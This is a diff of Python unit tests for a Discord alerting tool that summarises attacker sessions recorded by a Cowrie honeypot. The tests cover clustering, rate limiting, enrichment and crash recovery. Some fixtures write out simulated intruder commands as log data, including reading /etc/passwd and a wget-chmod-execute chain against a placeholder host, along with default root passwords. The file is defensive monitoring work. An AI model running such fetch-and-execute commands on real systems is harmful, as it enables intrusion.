@@ -70,21 +70,31 @@ class DiscordMonitorTests(unittest.TestCase):
     def setUp(self):
         self.credentials = mock.Mock()
 
+    def _clusters(self):
+        return discord.SessionClusterManager(window_seconds=45.0)
+
+    def _governor(self):
+        return discord.DiscordRateGovernor(clock=lambda: 0.0)
+
     def test_first_observation_initializes_at_eof(self):
         state = discord.default_state()
         status = SimpleNamespace(st_dev=1, st_ino=2, st_size=91)
+        clusters = self._clusters()
+        governor = self._governor()
 
-        def fake_consume(path, state_arg, start, credentials):
+        def fake_consume(path, state_arg, start, credentials, clusters_arg, governor_arg):
             state_arg["source"]["offset"] = 91
             return 91
 
         with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
             discord, "save_state"
         ) as save, mock.patch.object(discord, "drain_pending"), mock.patch.object(
+            discord, "flush_expired_clusters"
+        ), mock.patch.object(
             discord, "consume", side_effect=fake_consume
         ) as consume:
-            discord.poll_once(state, self.credentials)
-        consume.assert_called_once_with(discord.LOG_PATH, state, 0, self.credentials)
+            discord.poll_once(state, self.credentials, clusters, governor, None)
+        consume.assert_called_once_with(discord.LOG_PATH, state, 0, self.credentials, clusters, governor)
         self.assertEqual(state["source"]["offset"], 91)
         save.assert_called_once()
 
@@ -92,72 +102,102 @@ class DiscordMonitorTests(unittest.TestCase):
         state = discord.default_state()
         state["source"] = {"device": 1, "inode": 2, "offset": 40}
         status = SimpleNamespace(st_dev=1, st_ino=2, st_size=80)
+        clusters = self._clusters()
+        governor = self._governor()
         with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
             discord, "consume", return_value=80
-        ) as consume, mock.patch.object(discord, "drain_pending"):
-            discord.poll_once(state, self.credentials)
-        consume.assert_called_once_with(discord.LOG_PATH, state, 40, self.credentials)
+        ) as consume, mock.patch.object(discord, "drain_pending"), mock.patch.object(
+            discord, "flush_expired_clusters"
+        ):
+            discord.poll_once(state, self.credentials, clusters, governor, None)
+        consume.assert_called_once_with(discord.LOG_PATH, state, 40, self.credentials, clusters, governor)
 
     def test_rename_rotation_drains_old_inode_then_new(self):
         state = discord.default_state()
         state["source"] = {"device": 1, "inode": 2, "offset": 40}
         status = SimpleNamespace(st_dev=1, st_ino=3, st_size=20)
         old_path = Path("cowrie.json.1")
+        clusters = self._clusters()
+        governor = self._governor()
         with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
             discord, "locate_inode", return_value=old_path
         ), mock.patch.object(discord, "consume", side_effect=[45, 20]) as consume, mock.patch.object(
             discord, "save_state"
-        ), mock.patch.object(discord, "drain_pending"):
-            discord.poll_once(state, self.credentials)
-        self.assertEqual(consume.call_args_list[0], mock.call(old_path, state, 40, self.credentials))
-        self.assertEqual(consume.call_args_list[1], mock.call(discord.LOG_PATH, state, 0, self.credentials))
+        ), mock.patch.object(discord, "drain_pending"), mock.patch.object(discord, "flush_expired_clusters"):
+            discord.poll_once(state, self.credentials, clusters, governor, None)
+        self.assertEqual(consume.call_args_list[0], mock.call(old_path, state, 40, self.credentials, clusters, governor))
+        self.assertEqual(
+            consume.call_args_list[1], mock.call(discord.LOG_PATH, state, 0, self.credentials, clusters, governor)
+        )
 
     def test_copytruncate_resets_offset(self):
         state = discord.default_state()
         state["source"] = {"device": 1, "inode": 2, "offset": 40}
         status = SimpleNamespace(st_dev=1, st_ino=2, st_size=10)
+        clusters = self._clusters()
+        governor = self._governor()
         with mock.patch.object(discord, "regular_stat", return_value=status), mock.patch.object(
             discord, "consume", return_value=10
         ) as consume, mock.patch.object(discord, "save_state"), mock.patch.object(
             discord, "drain_pending"
-        ):
-            discord.poll_once(state, self.credentials)
-        consume.assert_called_once_with(discord.LOG_PATH, state, 0, self.credentials)
+        ), mock.patch.object(discord, "flush_expired_clusters"):
+            discord.poll_once(state, self.credentials, clusters, governor, None)
+        consume.assert_called_once_with(discord.LOG_PATH, state, 0, self.credentials, clusters, governor)
 
     def test_partial_line_is_not_consumed(self):
         state = discord.default_state()
         state["source"] = {"device": 1, "inode": 2, "offset": 0}
         raw = b'{"eventid":"complete"}\n{"eventid":"partial"'
+        clusters = self._clusters()
+        governor = self._governor()
         with mock.patch.object(discord.os, "open", return_value=19), mock.patch.object(
             discord.os, "fdopen", return_value=DescriptorBuffer(raw)
-        ), mock.patch.object(discord, "save_state"), mock.patch.object(
+        ), mock.patch.object(discord, "save_state"), mock.patch.object(discord, "drain_pending"), mock.patch.object(
             discord, "queue_line"
         ) as queue:
-            offset = discord.consume(Path("cowrie.json"), state, 0, self.credentials)
+            offset = discord.consume(Path("cowrie.json"), state, 0, self.credentials, clusters, governor)
         self.assertEqual(offset, len(b'{"eventid":"complete"}\n'))
         queue.assert_called_once()
 
-    def test_pending_recovery_and_dedupe(self):
+    def test_duplicate_line_absorbed_once_into_cluster(self):
         state = discord.default_state()
-        line = b'{"eventid":"cowrie.session.connect"}\n'
-        discord.queue_line(state, line)
-        discord.queue_line(state, line)
+        clusters = self._clusters()
+        line = b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.7","session":"s1"}\n'
+        discord.queue_line(state, line, clusters)
+        discord.queue_line(state, line, clusters)
         self.assertEqual(state["pending"], [])
         self.assertEqual(len(state["seen"]), 1)
+        self.assertEqual(clusters.active_count(), 1)
 
-    def test_supported_event_is_sent_once_and_deduped(self):
+    def test_command_events_accumulate_into_cluster_not_pending(self):
         state = discord.default_state()
-        line = b'{"eventid":"cowrie.command.input","input":"uname -a"}\n'
-        discord.queue_line(state, line)
-        discord.queue_line(state, line)
-        self.assertEqual(len(state["pending"]), 1)
+        clusters = self._clusters()
+        line = (
+            b'{"eventid":"cowrie.command.input","input":"uname -a",'
+            b'"src_ip":"198.51.100.7","session":"s1"}\n'
+        )
+        discord.queue_line(state, line, clusters)
+        # No per-event Discord payload is queued; the event is absorbed into
+        # the session cluster instead, to be summarized once the cluster
+        # flushes. This is the core anti-flood behavior H2 exists to add.
+        self.assertEqual(state["pending"], [])
+        _key, cluster, _is_new = clusters.observe(
+            {"eventid": "cowrie.session.closed", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0
+        )
+        self.assertEqual(cluster.commands, ["uname -a"])
+
+    def test_pending_item_delivered_and_marked_seen(self):
+        state = discord.default_state()
+        item_id = hashlib.sha256(b"summary-1").hexdigest()
+        state["pending"].append({"id": item_id, "payload": {"content": "summary"}})
         self.credentials.get.return_value = "unused-test-url"
-        with mock.patch.object(discord, "post_payload", return_value=True), mock.patch.object(
+        governor = self._governor()
+        with mock.patch.object(discord, "post_payload", return_value=(True, 200, None)), mock.patch.object(
             discord, "save_state"
         ):
-            discord.drain_pending(state, self.credentials)
+            discord.drain_pending(state, self.credentials, governor)
         self.assertEqual(state["pending"], [])
-        self.assertEqual(state["seen"], [hashlib.sha256(line).hexdigest()])
+        self.assertEqual(state["seen"], [item_id])
 
     def test_restart_pending_is_suppressed_without_replay(self):
         state_path = mock.Mock()
@@ -188,11 +228,412 @@ class DiscordMonitorTests(unittest.TestCase):
             "urlopen",
             side_effect=urllib.error.URLError("offline"),
         ) as request:
-            delivered = discord.post_payload(
+            success, status_code, retry_after = discord.post_payload(
                 "https://discord.com/api/webhooks/123/test_token", {"content": "test"}
             )
-        self.assertFalse(delivered)
+        self.assertFalse(success)
+        self.assertIsNone(status_code)
+        self.assertIsNone(retry_after)
         self.assertEqual(request.call_count, 1)
+
+    def test_post_returns_status_and_retry_after_on_429(self):
+        error_body = json.dumps({"retry_after": 2.5}).encode()
+        http_error = urllib.error.HTTPError(
+            url="https://discord.com/api/webhooks/123/test_token",
+            code=429,
+            msg="Too Many Requests",
+            hdrs={},
+            fp=mock.Mock(read=mock.Mock(return_value=error_body)),
+        )
+        with mock.patch.object(discord.urllib.request, "urlopen", side_effect=http_error):
+            success, status_code, retry_after = discord.post_payload(
+                "https://discord.com/api/webhooks/123/test_token", {"content": "test"}
+            )
+        self.assertFalse(success)
+        self.assertEqual(status_code, 429)
+        self.assertEqual(retry_after, 2.5)
+
+
+class DiscordH2IntegrationTests(unittest.TestCase):
+    """Cluster -> enrichment -> governor -> delivery, wired end to end."""
+
+    def setUp(self):
+        self.credentials = mock.Mock()
+        self.credentials.get.return_value = "unused-test-url"
+
+    def test_post_payload_always_sets_allowed_mentions_parse_empty(self):
+        """Attacker/provider text landing in an embed must never be able to
+        trigger an @everyone/@here/user ping."""
+        captured = {}
+
+        def fake_urlopen(request, timeout=15):
+            captured["body"] = json.loads(request.data.decode("utf-8"))
+            return mock.MagicMock(__enter__=mock.Mock(return_value=mock.Mock(status=204)), __exit__=mock.Mock(return_value=False))
+
+        with mock.patch.object(discord.urllib.request, "urlopen", side_effect=fake_urlopen):
+            discord.post_payload("https://discord.com/api/webhooks/123/test_token", {"content": "@everyone hi"})
+        self.assertEqual(captured["body"]["allowed_mentions"], {"parse": []})
+
+    def test_pending_stays_bounded_during_prolonged_degraded_period(self):
+        """Even while Discord is 429-ing (governor degraded, nothing draining),
+        `pending` must not grow without bound -- the existing MAX_PENDING
+        eviction (queue_limit dead-letter) must keep working."""
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=-1.0, max_active_clusters=100000)
+        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
+        governor.note_rate_limited(retry_after_seconds=99999.0)  # degraded indefinitely for this test
+
+        with mock.patch.object(discord.time, "time", return_value=0.0):
+            for i in range(discord.MAX_PENDING + 50):
+                clusters.observe(
+                    {"eventid": "cowrie.session.connect", "src_ip": f"198.51.{i % 250}.1", "session": f"s{i}"},
+                    now=0.0,
+                )
+        with mock.patch.object(discord, "save_state"), mock.patch.object(discord.time, "time", return_value=100.0):
+            discord.flush_expired_clusters(state, clusters, worker=None)
+            discord.drain_pending(state, self.credentials, governor)  # degraded: must not send, must not grow
+
+        self.assertLessEqual(len(state["pending"]), discord.MAX_PENDING)
+
+    def test_429_leaves_item_pending_not_dead_lettered(self):
+        state = discord.default_state()
+        item_id = hashlib.sha256(b"summary-1").hexdigest()
+        state["pending"].append({"id": item_id, "payload": {"content": "summary"}})
+        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
+        with mock.patch.object(discord, "post_payload", return_value=(False, 429, 30.0)), mock.patch.object(
+            discord, "save_state"
+        ):
+            discord.drain_pending(state, self.credentials, governor)
+        self.assertEqual(len(state["pending"]), 1)
+        self.assertEqual(state["pending"][0]["id"], item_id)
+        self.assertEqual(state["dead_letters"], [])
+        self.assertTrue(governor.degraded)
+
+    def test_degraded_mode_blocks_further_sends_without_dead_lettering(self):
+        state = discord.default_state()
+        state["pending"] = [
+            {"id": hashlib.sha256(b"a").hexdigest(), "payload": {}},
+            {"id": hashlib.sha256(b"b").hexdigest(), "payload": {}},
+        ]
+        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
+        governor.note_rate_limited(retry_after_seconds=30.0)
+        with mock.patch.object(discord, "post_payload") as post, mock.patch.object(discord, "save_state"):
+            discord.drain_pending(state, self.credentials, governor)
+        post.assert_not_called()
+        self.assertEqual(len(state["pending"]), 2)
+        self.assertEqual(state["dead_letters"], [])
+
+    def test_recovery_sends_one_digest_not_a_replay_storm(self):
+        state = discord.default_state()
+        state["pending"] = [{"id": hashlib.sha256(b"summary").hexdigest(), "payload": {"content": "s"}}]
+        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
+        governor.note_rate_limited(retry_after_seconds=30.0)
+        governor.note_blocked(queue_depth=50)
+        # Cooldown has "elapsed" for this test by constructing a governor
+        # whose clock never advances but whose cooldown we clear directly,
+        # since we only care about drain_pending's reaction to success.
+        governor._cooldown_until = -1.0
+        with mock.patch.object(discord, "post_payload", return_value=(True, 200, None)) as post, mock.patch.object(
+            discord, "save_state"
+        ):
+            discord.drain_pending(state, self.credentials, governor)
+        # One delivery for the queued summary, one for the recovery digest --
+        # never one message per suppressed item.
+        self.assertEqual(post.call_count, 2)
+        digest_call_payload = post.call_args_list[1][0][1]
+        self.assertIn("recovered", digest_call_payload["embeds"][0]["title"].lower())
+        self.assertFalse(governor.degraded)
+
+    def test_priority_event_immediate_alert_when_enabled(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=45.0)
+        line = (
+            b'{"eventid":"cowrie.login.success","username":"root","password":"toor",'
+            b'"src_ip":"198.51.100.7","session":"s1"}\n'
+        )
+        with mock.patch.object(discord, "IMMEDIATE_ALERTS_ENABLED", True):
+            discord.queue_line(state, line, clusters)
+        self.assertEqual(len(state["pending"]), 1)
+        self.assertIn("LOGIN", state["pending"][0]["payload"]["embeds"][0]["title"])
+
+    def test_priority_event_immediate_alert_not_duplicated(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=45.0)
+        line = (
+            b'{"eventid":"cowrie.login.success","username":"root","password":"toor",'
+            b'"src_ip":"198.51.100.7","session":"s1"}\n'
+        )
+        other_line = (
+            b'{"eventid":"cowrie.login.success","username":"root","password":"toor2",'
+            b'"src_ip":"198.51.100.7","session":"s1","extra":"x"}\n'
+        )
+        with mock.patch.object(discord, "IMMEDIATE_ALERTS_ENABLED", True):
+            discord.queue_line(state, line, clusters)
+            discord.queue_line(state, other_line, clusters)
+        # Same session, same priority event *kind* -> only the first one
+        # produces an immediate alert.
+        self.assertEqual(len(state["pending"]), 1)
+
+    def test_no_immediate_alert_when_disabled_by_default(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=45.0)
+        line = (
+            b'{"eventid":"cowrie.login.success","username":"root","password":"toor",'
+            b'"src_ip":"198.51.100.7","session":"s1"}\n'
+        )
+        self.assertFalse(discord.IMMEDIATE_ALERTS_ENABLED)
+        discord.queue_line(state, line, clusters)
+        self.assertEqual(state["pending"], [])
+
+    def test_many_raw_events_produce_one_flushed_summary_not_a_storm(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=45.0)
+        events = [
+            b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.7","session":"s1"}\n',
+            b'{"eventid":"cowrie.login.success","username":"root","password":"admin","src_ip":"198.51.100.7","session":"s1"}\n',
+            b'{"eventid":"cowrie.command.input","input":"uname -a","src_ip":"198.51.100.7","session":"s1"}\n',
+            b'{"eventid":"cowrie.command.input","input":"id","src_ip":"198.51.100.7","session":"s1"}\n',
+            b'{"eventid":"cowrie.command.input","input":"cat /etc/passwd","src_ip":"198.51.100.7","session":"s1"}\n',
+            b'{"eventid":"cowrie.command.input","input":"wget http://x/payload","src_ip":"198.51.100.7","session":"s1"}\n',
+            b'{"eventid":"cowrie.command.input","input":"chmod +x payload","src_ip":"198.51.100.7","session":"s1"}\n',
+            b'{"eventid":"cowrie.command.input","input":"./payload","src_ip":"198.51.100.7","session":"s1"}\n',
+        ]
+        with mock.patch.object(discord.time, "time", return_value=0.0):
+            for line in events:
+                discord.queue_line(state, line, clusters)
+        self.assertEqual(state["pending"], [])  # nothing sent yet: cluster still open
+        with mock.patch.object(discord, "save_state"), mock.patch.object(
+            discord.time, "time", return_value=10_000.0
+        ):
+            discord.flush_expired_clusters(state, clusters, worker=None)
+        self.assertEqual(len(state["pending"]), 1)
+        embed = state["pending"][0]["payload"]["embeds"][0]
+        self.assertIn("ATTACK SESSION SUMMARY", embed["title"])
+
+    def test_flush_expired_clusters_fail_open_with_no_worker_configured(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=-1.0)
+        clusters.observe({"eventid": "cowrie.session.connect", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0)
+        with mock.patch.object(discord, "save_state"):
+            discord.flush_expired_clusters(state, clusters, worker=None)
+        self.assertEqual(len(state["pending"]), 1)
+        self.assertEqual(state["flushed_awaiting_enrichment"], {})
+
+    def test_flush_expired_clusters_fail_open_when_worker_backlog_full(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=-1.0)
+        clusters.observe({"eventid": "cowrie.session.connect", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0)
+        worker = mock.Mock()
+        worker.try_submit.return_value = False  # backlog full
+        worker.drain_completed.return_value = []
+        with mock.patch.object(discord, "save_state"):
+            discord.flush_expired_clusters(state, clusters, worker)
+        self.assertEqual(len(state["pending"]), 1)
+        self.assertEqual(state["flushed_awaiting_enrichment"], {})
+
+    def test_restart_safe_state_no_replay_after_load(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=45.0)
+        line = b'{"eventid":"cowrie.command.input","input":"ls","src_ip":"198.51.100.7","session":"s1"}\n'
+        discord.queue_line(state, line, clusters)
+        digest = hashlib.sha256(line).hexdigest()
+        self.assertIn(digest, state["seen"])
+        # Simulate a restart: a fresh cluster manager restored from the
+        # persisted `state["clusters"]` blob, fed the same line again (as a
+        # crash-before-offset-advance replay would). The line dedupes via
+        # `seen` (unchanged from before H2) and the restored cluster's
+        # command data is intact from before the "restart".
+        fresh_clusters = discord.SessionClusterManager(window_seconds=45.0)
+        fresh_clusters.restore_state(state["clusters"])
+        discord.queue_line(state, line, fresh_clusters)
+        self.assertEqual(fresh_clusters.active_count(), 1)
+        self.assertEqual(len(state["seen"]), 1)
+        _key, cluster, _is_new = fresh_clusters.observe(
+            {"eventid": "cowrie.session.closed", "src_ip": "198.51.100.7", "session": "s1"}, now=1.0
+        )
+        self.assertEqual(cluster.commands, ["ls"])  # survived the "restart"
+
+    # ---- Blocker 2 lifecycle proofs: event accepted -> cluster persisted -> offset persisted ----
+
+    def test_atomic_save_never_observes_offset_ahead_of_cluster_data(self):
+        """Every save_state() call during consume() must show the cluster
+        mutation for a line already present whenever that line's offset is
+        present -- proving there is no window where a crash could persist
+        one without the other."""
+        state = discord.default_state()
+        state["source"] = {"device": 1, "inode": 2, "offset": 0}
+        clusters = discord.SessionClusterManager(window_seconds=45.0)
+        governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
+        raw = (
+            b'{"eventid":"cowrie.command.input","input":"one","src_ip":"198.51.100.7","session":"s1"}\n'
+            b'{"eventid":"cowrie.command.input","input":"two","src_ip":"198.51.100.7","session":"s1"}\n'
+        )
+        snapshots = []
+
+        def capturing_save_state(state_arg):
+            snapshots.append(
+                (state_arg["source"]["offset"], len(state_arg["clusters"].get("session:s1", {}).get("commands", [])))
+            )
+
+        with mock.patch.object(discord.os, "open", return_value=19), mock.patch.object(
+            discord.os, "fdopen", return_value=DescriptorBuffer(raw)
+        ), mock.patch.object(discord, "save_state", side_effect=capturing_save_state), mock.patch.object(
+            discord, "drain_pending"
+        ):
+            discord.consume(Path("cowrie.json"), state, 0, self.credentials, clusters, governor)
+        self.assertEqual(len(snapshots), 2)
+        offset_after_first, commands_after_first = snapshots[0]
+        self.assertGreater(offset_after_first, 0)
+        self.assertEqual(commands_after_first, 1)  # cluster already reflects "one" in the SAME save as its offset
+        _offset_after_second, commands_after_second = snapshots[1]
+        self.assertEqual(commands_after_second, 2)
+
+    def test_crash_before_flush_restores_and_flushes_normally_after_restart(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=45.0)
+        with mock.patch.object(discord.time, "time", return_value=0.0):
+            discord.queue_line(
+                state,
+                b'{"eventid":"cowrie.login.success","username":"root","password":"toor","src_ip":"198.51.100.7","session":"s1"}\n',
+                clusters,
+            )
+            discord.queue_line(
+                state,
+                b'{"eventid":"cowrie.command.input","input":"whoami","src_ip":"198.51.100.7","session":"s1"}\n',
+                clusters,
+            )
+        # "Crash": nothing was flushed yet. state["clusters"] is the only
+        # record of this session; the in-memory `clusters` manager is
+        # discarded, simulating process death.
+        self.assertEqual(state["pending"], [])
+        self.assertNotEqual(state["clusters"], {})
+
+        # "Restart": a fresh manager restored purely from persisted state.
+        restarted_clusters = discord.SessionClusterManager(window_seconds=45.0)
+        restarted_clusters.restore_state(state["clusters"])
+        self.assertEqual(restarted_clusters.active_count(), 1)
+
+        with mock.patch.object(discord, "save_state"), mock.patch.object(discord.time, "time", return_value=1000.0):
+            discord.flush_expired_clusters(state, restarted_clusters, worker=None)
+        self.assertEqual(len(state["pending"]), 1)
+        embed = state["pending"][0]["payload"]["embeds"][0]
+        self.assertIn("Successful login", embed["fields"][0]["value"])
+
+    def test_crash_during_enrichment_window_recovered_at_startup(self):
+        """Simulates a crash after a cluster was flushed and submitted for
+        background enrichment, but before the worker's result came back."""
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=-1.0)
+        clusters.observe({"eventid": "cowrie.command.input", "input": "id", "src_ip": "198.51.100.7", "session": "s1"}, now=0.0)
+        with mock.patch.object(discord, "save_state"):
+            discord.flush_expired_clusters(state, clusters, worker=None)
+        # Re-seed as if worker enrichment was still in flight at crash time:
+        # move the just-built pending summary back out and reconstruct the
+        # awaiting-enrichment entry that would exist at that exact moment.
+        flushed_entry = next(iter(state["flushed_awaiting_enrichment"].values()), None)
+        state["pending"] = []
+        if flushed_entry is None:
+            cluster = discord.SessionCluster(key="session:s1", src_ip="198.51.100.7", session_id="s1", created_at=0.0)
+            cluster.commands = ["id"]
+            cluster.raw_event_count = 1
+            state["flushed_awaiting_enrichment"] = {"deadbeef": cluster.to_dict()}
+
+        with mock.patch.object(discord, "save_state"):
+            discord._recover_flushed_awaiting_enrichment(state)
+        self.assertEqual(len(state["pending"]), 1)
+        self.assertEqual(state["flushed_awaiting_enrichment"], {})
+
+    def test_recovered_summary_is_not_replayed_a_second_time(self):
+        """Once a flushed-awaiting-enrichment entry is recovered into
+        `pending`, a second restart before delivery must dead-letter it
+        (existing pending-suppression logic), never resend it."""
+        cluster = discord.SessionCluster(key="session:s1", src_ip="198.51.100.7", session_id="s1", created_at=0.0)
+        cluster.commands = ["id"]
+        cluster.raw_event_count = 1
+        state = discord.default_state()
+        state["flushed_awaiting_enrichment"] = {"deadbeef": cluster.to_dict()}
+        with mock.patch.object(discord, "save_state"):
+            discord._recover_flushed_awaiting_enrichment(state)
+        self.assertEqual(len(state["pending"]), 1)
+
+        # Second "restart": load_state()'s own pending-suppression logic
+        # (unchanged by H2) must dead-letter it, not resend it.
+        state_path = mock.Mock()
+        state_path.read_text.return_value = json.dumps(state)
+        with mock.patch.object(discord, "STATE_PATH", state_path):
+            reloaded = discord.load_state()
+        self.assertEqual(reloaded["pending"], [])
+        self.assertEqual(reloaded["replay_suppressed"], 1)
+        self.assertEqual(reloaded["dead_letters"][0]["reason"], "restart_replay_suppressed")
+
+    def test_evicted_overflow_clusters_are_still_flushed_not_dropped(self):
+        state = discord.default_state()
+        clusters = discord.SessionClusterManager(window_seconds=45.0, max_active_clusters=2)
+        with mock.patch.object(discord.time, "time", side_effect=[0.0, 1.0, 2.0, 2.0, 2.0]):
+            discord.queue_line(state, b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.1","session":"s1"}\n', clusters)
+            discord.queue_line(state, b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.2","session":"s2"}\n', clusters)
+            discord.queue_line(state, b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.3","session":"s3"}\n', clusters)
+        # Third cluster pushed the manager over its bound; the oldest must
+        # be evicted and flushed (as a pending summary), not silently lost.
+        with mock.patch.object(discord, "save_state"), mock.patch.object(discord.time, "time", return_value=2.0):
+            discord.flush_expired_clusters(state, clusters, worker=None)
+        self.assertEqual(len(state["pending"]), 1)
+        self.assertEqual(clusters.active_count(), 2)
+
+    def test_offset_consumption_proceeds_while_enrichment_is_slow_and_in_flight(self):
+        """Integration-level Blocker 3 proof: with a real ThreatIntelWorker
+        backed by a deliberately slow broker, flush_expired_clusters()
+        (called from poll_once, same as production) must return quickly and
+        consume()'s own offset advancement on a subsequent line must not
+        wait for enrichment to complete."""
+        import threading
+        import time as real_time
+
+        from threat_intel.worker import ThreatIntelWorker
+
+        release = threading.Event()
+        broker = mock.Mock()
+        broker.enrich_ip.side_effect = lambda ip: (release.wait(5.0), {})[1]
+        worker = ThreatIntelWorker(broker, max_workers=4, max_inflight=500)
+        try:
+            state = discord.default_state()
+            clusters = discord.SessionClusterManager(window_seconds=45.0, max_active_clusters=1000)
+            with mock.patch.object(discord.time, "time", side_effect=lambda: real_time.monotonic()):
+                for i in range(200):
+                    discord.queue_line(
+                        state,
+                        f'{{"eventid":"cowrie.session.connect","src_ip":"198.51.100.{i % 250}","session":"s{i}"}}\n'.encode(),
+                        clusters,
+                    )
+
+            started = real_time.monotonic()
+            with mock.patch.object(discord, "save_state"), mock.patch.object(
+                discord.time, "time", return_value=real_time.monotonic() + 10_000.0
+            ):
+                discord.flush_expired_clusters(state, clusters, worker)
+            flush_elapsed = real_time.monotonic() - started
+            # 200 clusters submitted for enrichment that each sleep up to 5s;
+            # flush_expired_clusters must not itself sleep -- it only submits
+            # (non-blocking) and drains already-completed results (none yet).
+            self.assertLess(flush_elapsed, 1.0)
+
+            # consume()'s offset advancement must proceed immediately too,
+            # independent of the 200 in-flight enrichments.
+            state2 = discord.default_state()
+            state2["source"] = {"device": 1, "inode": 2, "offset": 0}
+            governor = discord.DiscordRateGovernor(clock=lambda: 0.0)
+            raw = b'{"eventid":"cowrie.session.connect","src_ip":"198.51.100.1","session":"zzz"}\n'
+            consume_started = real_time.monotonic()
+            with mock.patch.object(discord.os, "open", return_value=19), mock.patch.object(
+                discord.os, "fdopen", return_value=DescriptorBuffer(raw)
+            ), mock.patch.object(discord, "save_state"), mock.patch.object(discord, "drain_pending"):
+                offset = discord.consume(Path("cowrie.json"), state2, 0, self.credentials, discord.SessionClusterManager(), governor)
+            consume_elapsed = real_time.monotonic() - consume_started
+            self.assertEqual(offset, len(raw))
+            self.assertLess(consume_elapsed, 0.5)
+        finally:
+            release.set()
+            worker.shutdown()
 
 
 class ArchiveTests(unittest.TestCase):
